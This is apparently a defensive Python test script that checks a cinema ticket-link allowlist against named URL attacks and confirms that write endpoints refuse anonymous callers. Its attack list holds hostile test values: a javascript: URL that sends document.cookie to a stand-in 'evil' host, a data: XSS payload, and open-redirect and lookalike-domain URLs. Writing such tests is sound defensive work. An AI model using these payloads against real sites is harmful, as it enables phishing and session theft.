"""Attack the ticket-link allowlist and report anything that gets through.

Run it after touching ticket_urls.py, and after any chain changes its booking
flow. Every case below is a real, named technique -- the comments give the name
so this doubles as something to read.

    python test_ticket_url_security.py
    python test_ticket_url_security.py --url https://on-cinema-now.fly.dev

The offline half tests the policy directly and writes nothing, so it is safe to
run against a live checkout as often as you like. The --url half only checks
that the write endpoints refuse an anonymous caller; it never sends a payload,
because a real push needs the token and would alter the database.
"""

import argparse
import sys

import ticket_urls

# Links that must keep working. A security check that quietly breaks these is
# worse than none: the app loses a chain and nothing obviously looks wrong.
LEGITIMATE = [
    ("cinema_city", "https://tickets.cinema-city.co.il/order/849691"),
    ("hot_cinema", "https://hotcinema.co.il/order?theaterId=16&eventId=147271"),
    ("lev", "https://www.lev.co.il/order/?pcode=604155&loc=לב אבן יהודה"),
    ("movieland", "https://ecom.biggerpicture.ai/site/1293?code=1293-22398&saleChannelCode=web&languageid=he_IL"),
    ("planet", "https://www.planetcinema.co.il/films/idiots/8462s2r#/buy-tickets-by-film?in-cinema=1025&at=2026-09-01&for-movie=8462s2r&view-mode=list"),
]

# (technique, chain, url). Each must be refused.
ATTACKS = [
    # Plain phishing: the whole goal. A convincing fake checkout on a host the
    # attacker owns. No script anywhere -- this is why an XSS filter alone
    # would not have helped.
    ("phishing host", "planet", "https://evil.example/checkout"),

    # Open redirect (CWE-601). The important one: a real cinema domain with a
    # /go?url= style endpoint bounces the user onward. Passes any check that
    # only looks at the hostname.
    ("open redirect", "planet", "https://www.planetcinema.co.il/go?url=https://evil.example"),
    ("open redirect, encoded", "planet",
     "https://www.planetcinema.co.il/films/x?r=https%3A%2F%2Fevil.example"),
    # Double encoding (CWE-174): one unquote turns %252F into %2F, not "/", so
    # a filter that decodes once sees nothing wrong.
    ("open redirect, double-encoded", "planet",
     "https://www.planetcinema.co.il/films/x?r=https%253A%252F%252Fevil.example"),
    # Protocol-relative: "//host" inherits the current scheme and is a URL.
    ("protocol-relative", "planet",
     "https://www.planetcinema.co.il/films/x?r=//evil.example"),
    ("fragment smuggling", "lev", "https://www.lev.co.il/order/#https://evil.example"),

    # Semantic URL attack / userinfo spoofing. Everything before "@" is
    # credentials, so the real host is evil.example. Reading netloc instead of
    # hostname, or eyeballing the string, gets this wrong.
    ("userinfo confusion", "planet", "https://www.planetcinema.co.il@evil.example/checkout"),

    # Domain suffix confusion. Defeats `host.endswith("planetcinema.co.il")`
    # and `"planetcinema.co.il" in host`.
    ("suffix lookalike", "planet", "https://www.planetcinema.co.il.evil.example/checkout"),
    ("prefix lookalike", "planet", "https://notplanetcinema.co.il/checkout"),

    # Dangerous schemes. React 19 blocks javascript: in an href by itself, and
    # browsers block top-level data: navigation -- but neither should be the
    # only thing standing between a stored string and the user.
    ("javascript: scheme", "planet", "javascript:fetch('//evil/'+document.cookie)"),
    ("data: scheme", "movieland", "data:text/html,<script>alert(1)</script>"),

    # Downgrade: an http link carries the booking session in clear text.
    ("http downgrade", "planet", "http://www.planetcinema.co.il/films/idiots/8462s2r"),

    # Real host, wrong area of the site -- account pages, logout CSRF, anything
    # that is not selling this ticket.
    ("off-path on real host", "planet", "https://www.planetcinema.co.il/account/settings"),

    # Right host for a different chain: a Movieland link stored as a Planet
    # screening. Not an attack on its own, but it means the mapping is wrong.
    ("host from another chain", "planet", "https://ecom.biggerpicture.ai/site/1"),

    ("empty", "planet", ""),
    ("unknown chain", "bogus", "https://www.planetcinema.co.il/films/idiots/8462s2r"),
]


def check_policy() -> int:
    failures = 0

    print("Legitimate links (must all pass)")
    for chain, url in LEGITIMATE:
        reason = ticket_urls.rejection_reason(chain, url)
        if reason is None:
            print(f"  ok      {chain}")
        else:
            failures += 1
            print(f"  BROKEN  {chain}: {reason}\n            {url}")

    print("\nAttacks (must all be refused)")
    for technique, chain, url in ATTACKS:
        reason = ticket_urls.rejection_reason(chain, url)
        if reason:
            print(f"  blocked {technique:30s} {reason}")
        else:
            failures += 1
            print(f"  GOT THROUGH {technique:26s} {url}")

    return failures


def check_endpoints(base: str) -> int:
    """The write paths must refuse an anonymous caller."""
    import requests

    failures = 0
    print(f"\nUnauthenticated write attempts against {base}")
    probes = [
        ("POST", "/api/ingest/planet", {"theatres": [], "movies": [], "showtimes": []}),
        ("POST", "/scrape/planet", None),
    ]
    for method, path, body in probes:
        try:
            r = requests.request(method, base.rstrip("/") + path, json=body, timeout=20)
        except Exception as exc:
            failures += 1
            print(f"  ERROR   {method} {path}: {exc}")
            continue
        if r.status_code in (401, 403, 503):
            print(f"  refused {method} {path} -> {r.status_code}")
        else:
            failures += 1
            print(f"  OPEN    {method} {path} -> {r.status_code}")
    return failures


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    parser.add_argument("--url", help="also check the write endpoints on a running server")
    args = parser.parse_args()

    failures = check_policy()
    if args.url:
        failures += check_endpoints(args.url)

    print()
    if failures:
        print(f"FAILED: {failures} problem(s).")
        return 1
    print("All clear.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
